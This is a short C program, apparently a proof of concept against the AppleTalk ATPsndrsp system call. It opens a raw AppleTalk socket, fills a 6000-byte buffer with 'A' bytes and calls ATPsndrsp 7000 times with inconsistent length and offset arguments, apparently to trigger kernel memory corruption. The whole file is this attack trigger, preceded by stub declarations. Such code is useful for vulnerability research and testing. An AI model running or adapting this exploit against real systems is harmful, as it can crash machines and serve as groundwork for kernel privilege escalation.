
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int AF_APPLETALK ;
 int ATPsndrsp (int,unsigned char*,unsigned int,unsigned int) ;
 int SOCK_RAW ;
 int close (int) ;
 int exit (int) ;
 int free (char*) ;
 char* malloc (int) ;
 int memset (char*,int,int) ;
 int printf (char*,char*,unsigned int,unsigned int) ;
 int socket (int ,int ,int ) ;
 int strlen (char*) ;

int main(int argc, char **argv) {
        int fd, retv, i;
  unsigned int a, b;
  char *powder;

        if ((fd = socket(AF_APPLETALK, SOCK_RAW, 0)) < 0)
                exit(1);

  powder = malloc(6000);
  memset(powder, 0x41, 5999);

  for (i=0; i < 7000; i++) {
   a = strlen(powder) - i;
   b = i;
   printf("powder@%p a=%u b=%u\n", powder, a, b);
   retv = ATPsndrsp(fd, (unsigned char *)powder, a, b);
  }

        close(fd);
  free(powder);
  return 0;
}
